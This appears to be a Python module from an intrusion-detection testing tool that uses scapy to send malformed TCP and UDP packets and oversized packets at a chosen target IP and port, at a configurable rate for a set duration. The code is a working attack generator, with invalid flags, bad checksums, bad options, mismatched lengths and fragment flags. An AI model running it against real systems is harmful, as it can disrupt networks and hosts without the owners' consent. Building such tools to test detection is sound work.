"""
Malformed packet module — invalid TCP flags, bad checksums, oversized packets.

These packets are designed to trigger IDS anomaly detection by deviating
from protocol standards.
"""

from __future__ import annotations

import logging
import random
import time

from scapy.all import IP, TCP, UDP, Raw, send, RandShort, RandString, conf

log = logging.getLogger(__name__)

conf.verb = 0

HANDLERS = {}


def _register(name):
    def decorator(fn):
        HANDLERS[name] = fn
        return fn
    return decorator


def run_attack(
    sub_type: str,
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    handler = HANDLERS.get(sub_type)
    if handler is None:
        raise ValueError(f"Unknown malformed sub_type: {sub_type!r}")
    return handler(target_ip, target_port, duration, rate_multiplier, params)


# ── Malformed TCP ────────────────────────────────────────

@_register("malformed_tcp")
def malformed_tcp(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """
    Send TCP packets with invalid flag combinations, bad checksums,
    or illegal option fields.
    """
    base_rate = params.get("packet_rate", 200)
    pps = int(base_rate * rate_multiplier)
    variant = params.get("variant", "bad_flags")

    log.info("Malformed TCP (%s) → %s:%d at ~%d pps", variant, target_ip, target_port, pps)

    packets_sent = 0
    deadline = time.time() + duration

    # Invalid TCP flag combinations
    bad_flag_combos = ["FSRPAUEC", "SR", "FRPU", ""]  # all flags, SYN+RST, etc.

    while time.time() < deadline:
        if variant == "bad_flags":
            flags = random.choice(bad_flag_combos)
            pkt = (
                IP(dst=target_ip) /
                TCP(sport=RandShort(), dport=target_port, flags=flags) /
                Raw(load=RandString(size=random.randint(10, 100)))
            )
        elif variant == "bad_checksum":
            pkt = (
                IP(dst=target_ip) /
                TCP(
                    sport=RandShort(),
                    dport=target_port,
                    flags="S",
                    chksum=random.randint(0, 65535),
                ) /
                Raw(load=b"\x00" * 20)
            )
        elif variant == "bad_options":
            # Invalid TCP options (random bytes in options field)
            pkt = (
                IP(dst=target_ip) /
                TCP(
                    sport=RandShort(),
                    dport=target_port,
                    flags="S",
                    options=[("NOP", None), ("NOP", None), ("Timestamp", (0, 0))],
                    dataofs=15,  # maximum, creates padding that doesn't match
                )
            )
        else:
            flags = random.choice(bad_flag_combos)
            pkt = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags=flags)

        send(pkt, verbose=False)
        packets_sent += 1
        time.sleep(1.0 / max(pps, 1))

    return {"packets_sent": packets_sent, "attack": "malformed_tcp", "variant": variant}


# ── Malformed UDP ────────────────────────────────────────

@_register("malformed_udp")
def malformed_udp(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """Send UDP packets with incorrect length fields or bad checksums."""
    base_rate = params.get("packet_rate", 200)
    pps = int(base_rate * rate_multiplier)
    variant = params.get("variant", "bad_length")

    log.info("Malformed UDP (%s) → %s:%d at ~%d pps", variant, target_ip, target_port, pps)

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        if variant == "bad_length":
            # Craft UDP with mismatched length field
            pkt = (
                IP(dst=target_ip) /
                UDP(sport=RandShort(), dport=target_port, len=8) /  # header-only length but has payload
                Raw(load=RandString(size=100))
            )
        elif variant == "bad_checksum":
            pkt = (
                IP(dst=target_ip) /
                UDP(sport=RandShort(), dport=target_port, chksum=0xFFFF) /
                Raw(load=RandString(size=50))
            )
        else:
            pkt = (
                IP(dst=target_ip) /
                UDP(sport=RandShort(), dport=target_port, len=4) /
                Raw(load=b"\xff" * 200)
            )

        send(pkt, verbose=False)
        packets_sent += 1
        time.sleep(1.0 / max(pps, 1))

    return {"packets_sent": packets_sent, "attack": "malformed_udp", "variant": variant}


# ── Oversized Packets ────────────────────────────────────

@_register("oversized_packets")
def oversized_packets(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """Send packets exceeding MTU to trigger fragmentation/reassembly issues."""
    base_rate = params.get("packet_rate", 100)
    pps = int(base_rate * rate_multiplier)
    pkt_size = params.get("packet_size", 65535)
    # Cap at 65535 (max IP packet) — actual payload after headers
    payload_size = min(pkt_size, 65500) - 28

    log.info("Oversized packets → %s:%d (size=%d) at ~%d pps", target_ip, target_port, pkt_size, pps)

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        # Alternate between TCP and UDP oversized
        if random.random() < 0.5:
            pkt = (
                IP(dst=target_ip, flags="MF") /  # More Fragments flag
                TCP(sport=RandShort(), dport=target_port, flags="PA") /
                Raw(load=b"\x41" * min(payload_size, 1400))  # fragmented
            )
        else:
            pkt = (
                IP(dst=target_ip) /
                UDP(sport=RandShort(), dport=target_port) /
                Raw(load=b"\x42" * min(payload_size, 1400))
            )

        send(pkt, verbose=False)
        packets_sent += 1
        time.sleep(1.0 / max(pps, 1))

    return {"packets_sent": packets_sent, "attack": "oversized_packets", "payload_size": payload_size}
